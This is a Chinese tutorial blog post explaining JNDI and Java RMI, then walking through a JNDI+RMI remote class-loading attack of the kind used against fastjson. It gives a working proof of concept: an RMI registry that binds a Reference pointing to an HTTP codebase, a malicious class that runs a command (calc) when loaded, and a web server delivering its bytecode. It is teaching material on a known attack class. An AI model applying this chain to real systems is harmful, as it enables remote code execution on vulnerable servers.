<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
JNDI 是什么
Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。

轻量级目录访问协议 (LDAP)
CORBA 公共对象服务命名（COS naming）
Java 远程方法调用 (RMI)
域名服务 (DNS)

这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。
// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup("rmi://localhost:1099/Object");
RMI 是什么
RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
RMI 有三个概念：

Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。
Server : 远程方法的提供者。
Client : 远程方法的调用者。

远程方法的定义需要满足两个条件：

实现 java.rmi.Remote。
继承 java.rmi.server.UnicastRemoteObject。

RMI 使用示例
Registry
创建 Registry'><title>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.51652302d3a998bf7887aed5c2cf89141bbebdf45a2c8f87b0717a3cf4f51c4e53c694c328fb1de78c3a625a1c01f80745bf1f2f42c040647a245cbbb6c2d1d7.css integrity="sha512-UWUjAtOpmL94h67Vws+JFBu+vfRaLI+HsHF6PPT1HE5TxpTDKPsd54w6YlocAfgHRb8fL0LAQGR6JFy7tsLR1w=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-10-30 13:43:00 +0800 +0800">2021-10-30</time></p></div><article><h1>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=jndi-是什么>JNDI 是什么</h2><p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><p>JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。</p><ul><li>轻量级目录访问协议 (LDAP)</li><li>CORBA 公共对象服务命名（COS naming）</li><li>Java 远程方法调用 (RMI)</li><li>域名服务 (DNS)</li></ul><p>这么说起来还是有点抽象，简单理解就是<strong>服务提供者</strong>提供一个类似Key Value的数据，<strong>JNDI</strong>可以通过这个 Key 获取到<strong>服务提供者</strong>上的提供的Value，因此JNDI是无法单独使用的。</p><p>使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。</p><pre tabindex=0><code>// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup(&#34;rmi://localhost:1099/Object&#34;);
</code></pre><h2 id=rmi-是什么>RMI 是什么</h2><p>RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。</p><p>RMI 有三个概念：</p><ul><li><strong>Registry :</strong> 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。</li><li><strong>Server :</strong> 远程方法的提供者。</li><li><strong>Client :</strong> 远程方法的调用者。</li></ul><p>远程方法的定义需要满足两个条件：</p><ol><li>实现 <code>java.rmi.Remote</code>。</li><li>继承 <code>java.rmi.server.UnicastRemoteObject</code>。</li></ol><h2 id=rmi-使用示例>RMI 使用示例</h2><h3 id=registry>Registry</h3><p>创建 Registry</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.concurrent.CountDownLatch;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RmiRegistry</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>static</span> Integer rmiPort <span style=color:#f92672>=</span> 1099;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> RemoteException, InterruptedException {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 创建一个 Registry</span>
</span></span><span style=display:flex><span>        LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(rmiPort);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;RMI server started on: 0.0.0.0:&#34;</span> <span style=color:#f92672>+</span> rmiPort);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 阻塞主线程，避免程序退出</span>
</span></span><span style=display:flex><span>        CountDownLatch countDownLatch <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> CountDownLatch(1);
</span></span><span style=display:flex><span>        countDownLatch.<span style=color:#a6e22e>await</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=server>Server</h3><p>定义接口，目的是给 Client 使用。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Remote;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>HelloService</span> <span style=color:#66d9ef>extends</span> Remote {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sayHello</span>(String name) <span style=color:#66d9ef>throws</span> RemoteException;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>定义实现类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HelloServiceImpl</span> <span style=color:#66d9ef>implements</span> HelloService {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sayHello</span>(String name) <span style=color:#66d9ef>throws</span> RemoteException {
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;hello &#34;</span> <span style=color:#f92672>+</span> name);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>注册对象，需要先使用 <strong>UnicastRemoteObject.exportObject()</strong> 将对象转换为 <strong>skeleton</strong>，<strong>skeleton</strong> 是 RMI 底层创建的一个代理对象，它继承了 <code>java.rmi.server.UnicastRemoteObject</code>，负责与 Client 进行网络通信。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Naming;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.Registry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.server.UnicastRemoteObject;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Server</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 实例化要暴露的对象</span>
</span></span><span style=display:flex><span>        HelloService helloService <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HelloServiceImpl();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将对象暴露出去，RMI 底层会创建该对象的一个代理对象，并监听一个端口用于处理来自客户端的请求</span>
</span></span><span style=display:flex><span>        HelloService skeleton <span style=color:#f92672>=</span> (HelloService) UnicastRemoteObject.<span style=color:#a6e22e>exportObject</span>(helloService, 1100);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 注册方式一开始 ====================*/</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 获取 Registry</span>
</span></span><span style=display:flex><span>        Registry registry <span style=color:#f92672>=</span> LocateRegistry.<span style=color:#a6e22e>getRegistry</span>(<span style=color:#e6db74>&#34;localhost&#34;</span>, 1099);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将这个对象注册到 Registry 中，第一个参数就是这个对象在 Registry 中的名称，客户端需要使用这个名称才能获取到这个对象</span>
</span></span><span style=display:flex><span>        registry.<span style=color:#a6e22e>bind</span>(<span style=color:#e6db74>&#34;helloService&#34;</span>, skeleton);
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 注册方式一结束 ====================*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 注册方式二开始 ====================*/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        Naming.bind(&#34;rmi://localhost:1099/helloService&#34;, skeleton);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 注册方式二结束 ====================*/</span>
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;export helloService&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可以看到注册方式二要比一简洁很多，这是 RMI 为了方便开发者使用，将注册方式一包装了一层，点击源码可以看到它的实现方式和注册方式一很相似。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>bind</span>(String name, Remote obj)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throws</span> AlreadyBoundException,
</span></span><span style=display:flex><span>        java.<span style=color:#a6e22e>net</span>.<span style=color:#a6e22e>MalformedURLException</span>,
</span></span><span style=display:flex><span>        RemoteException
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    ParsedNamingURL parsed <span style=color:#f92672>=</span> parseURL(name);
</span></span><span style=display:flex><span>    Registry registry <span style=color:#f92672>=</span> getRegistry(parsed);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (obj <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NullPointerException(<span style=color:#e6db74>&#34;cannot bind to null&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    registry.<span style=color:#a6e22e>bind</span>(parsed.<span style=color:#a6e22e>name</span>, obj);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=client>Client</h3><p>定义接口，因为 Server 和 Client 存在不同的 Java 程序中，Client 想要调用 Server 上面的服务需要知道方法才可以。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Remote;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.RemoteException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>interface</span> <span style=color:#a6e22e>HelloService</span> <span style=color:#66d9ef>extends</span> Remote {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sayHello</span>(String name) <span style=color:#66d9ef>throws</span> RemoteException;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>获取对象并调用，在这里获取到的对象是 <strong>stub</strong>，<strong>stub</strong> 负责与 Server 进行网络通信，例如在调用 <code>sayHello()</code> 方法时RMI通过网络请求位于服务端的真正方法，如果有返回值时还会将内容传递回来。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.Naming;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.Registry;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Client</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 获取方式一开始 ====================*/</span>
</span></span><span style=display:flex><span>        Registry registry <span style=color:#f92672>=</span> LocateRegistry.<span style=color:#a6e22e>getRegistry</span>(<span style=color:#e6db74>&#34;localhost&#34;</span>, 1099);
</span></span><span style=display:flex><span>        HelloService stub <span style=color:#f92672>=</span> (HelloService) registry.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;helloService&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 获取方式一结束 ====================*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 获取方式二开始 ====================*/</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        HelloService stub = (HelloService) Naming.lookup(&#34;rmi://localhost:1099/helloService&#34;);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/*================= 获取方式二结束 ====================*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        stub.<span style=color:#a6e22e>sayHello</span>(<span style=color:#e6db74>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>同理 <strong>Naming</strong> 也提供了获取远程对象的功能，它的源码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Remote <span style=color:#a6e22e>lookup</span>(String name)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throws</span> NotBoundException,
</span></span><span style=display:flex><span>        java.<span style=color:#a6e22e>net</span>.<span style=color:#a6e22e>MalformedURLException</span>,
</span></span><span style=display:flex><span>        RemoteException
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    ParsedNamingURL parsed <span style=color:#f92672>=</span> parseURL(name);
</span></span><span style=display:flex><span>    Registry registry <span style=color:#f92672>=</span> getRegistry(parsed);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (parsed.<span style=color:#a6e22e>name</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> registry;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> registry.<span style=color:#a6e22e>lookup</span>(parsed.<span style=color:#a6e22e>name</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=测试>测试</h3><p>按照 Registry > Server > Client 这个顺序启动，可以看到 Client 调用成功之后 Server 打印了如下内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hello 守法市民小杜
</span></span></code></pre></div><p>Registry、Server、Client 的调用关系可以总结为这个图：</p><p><img src="https://oss.typesafe.cn/rmi.png?t=111" alt=https://oss.typesafe.cn/rmi.png></p><h2 id=jndi--rmi-组合使用>JNDI + RMI 组合使用</h2><h3 id=定义-registry>定义 Registry</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.Reference;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.LocateRegistry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.rmi.registry.Registry;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.text.MessageFormat;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RMIServer</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Integer rmiServerPort <span style=color:#f92672>=</span> 1099;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> String httpServerAddress <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Integer httpServerPort <span style=color:#f92672>=</span> 80;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 工程地址，目的是让 JNDI 加载位于此处的类文件</span>
</span></span><span style=display:flex><span>        String factoryLocation <span style=color:#f92672>=</span> MessageFormat.<span style=color:#a6e22e>format</span>(<span style=color:#e6db74>&#34;http://{0}:{1}/&#34;</span>, httpServerAddress, httpServerPort <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 创建 Registry</span>
</span></span><span style=display:flex><span>        Registry registry <span style=color:#f92672>=</span> LocateRegistry.<span style=color:#a6e22e>createRegistry</span>(rmiServerPort);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 创建 JNDI 的引用</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// className 远程对象的类名称，不能为null</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// factory 加载类成功后要实例化的类名称</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// factoryLocation 提供类文件的地址，为null时从本地加载</span>
</span></span><span style=display:flex><span>        Reference reference <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Reference(<span style=color:#e6db74>&#34;Exploit&#34;</span>, <span style=color:#e6db74>&#34;Exploit&#34;</span>, factoryLocation);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将 JNDI引用 包装为 RMI 可注册的类</span>
</span></span><span style=display:flex><span>        ReferenceWrapper referenceWrapper <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ReferenceWrapper(reference);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将类信息注册到 Registry</span>
</span></span><span style=display:flex><span>        registry.<span style=color:#a6e22e>bind</span>(<span style=color:#e6db74>&#34;Exploit&#34;</span>, referenceWrapper);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;[*] RMI server listening on: 0.0.0.0:&#34;</span> <span style=color:#f92672>+</span> rmiServerPort);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可以看到我们创建 Registry 之后并没有 <code>export</code> 某一对象，是创建了一个 JNDI 的 Reference，目的是为了让 JNDI 去加载位于此处的类文件。</p><p>既然我们指定了类文件的存放地址是一个HTTP地址，那我们生成一个类，并且将其存放到这个HTTP服务下。</p><p>恶意类，简单起见不要添加包名称。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>HTTP服务，这里我为了方便使用了 sun 公司内置在 jdk 中的一个http server，也可以使用 nginx、apache、tomcat 等web服务器，只需要将编译后的 <code>Exploit.class</code> 放到根目录下即可。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.sun.net.httpserver.HttpServer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CannotCompileException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.NotFoundException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.OutputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.net.InetSocketAddress;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>WebServer</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> Integer port <span style=color:#f92672>=</span> 80;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, NotFoundException, CannotCompileException {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 javassist 获取类字节</span>
</span></span><span style=display:flex><span>        ClassPool classPool <span style=color:#f92672>=</span> ClassPool.<span style=color:#a6e22e>getDefault</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> CtClass ctClass <span style=color:#f92672>=</span> classPool.<span style=color:#a6e22e>get</span>(Exploit.<span style=color:#a6e22e>class</span>.<span style=color:#a6e22e>getName</span>());
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 修改类的名称，这里是为了去除类的包名，与 RMI Server 中保持一致</span>
</span></span><span style=display:flex><span>        ctClass.<span style=color:#a6e22e>setName</span>(<span style=color:#e6db74>&#34;Exploit&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> ctClass.<span style=color:#a6e22e>toBytecode</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HttpServer server <span style=color:#f92672>=</span> HttpServer.<span style=color:#a6e22e>create</span>(<span style=color:#66d9ef>new</span> InetSocketAddress(port), 0);
</span></span><span style=display:flex><span>        server.<span style=color:#a6e22e>createContext</span>(<span style=color:#e6db74>&#34;/&#34;</span>, httpExchange <span style=color:#f92672>-&gt;</span> {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 将类的字节写入到 response 中</span>
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Req Begin...&#34;</span>);
</span></span><span style=display:flex><span>            httpExchange.<span style=color:#a6e22e>sendResponseHeaders</span>(200, bytes.<span style=color:#a6e22e>length</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> OutputStream responseBody <span style=color:#f92672>=</span> httpExchange.<span style=color:#a6e22e>getResponseBody</span>();
</span></span><span style=display:flex><span>            responseBody.<span style=color:#a6e22e>write</span>(bytes);
</span></span><span style=display:flex><span>            responseBody.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Req End.&#34;</span>);
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;WebServer started at 0.0.0.0:&#34;</span> <span style=color:#f92672>+</span> port);
</span></span><span style=display:flex><span>        server.<span style=color:#a6e22e>start</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>最后我们写一个JNDI和RMI组合使用的测试</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.InitialContext;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.naming.NamingException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>JNDI_RMI</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> NamingException {
</span></span><span style=display:flex><span>        InitialContext context <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InitialContext();
</span></span><span style=display:flex><span>        Object obj <span style=color:#f92672>=</span> context.<span style=color:#a6e22e>lookup</span>(<span style=color:#e6db74>&#34;rmi://localhost:1099/Exploit&#34;</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;obj = &#34;</span> <span style=color:#f92672>+</span> obj);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>请求之后会输出会是一段异常代码，并且弹出了计算器，这是正常的。</p><pre tabindex=0><code>Exception in thread &#34;main&#34; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory]
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:472)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:124)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at cn.typesafe.jsv.fastjson.JNDI_RMI.main(JNDI_RMI.java:12)
Caused by: java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory
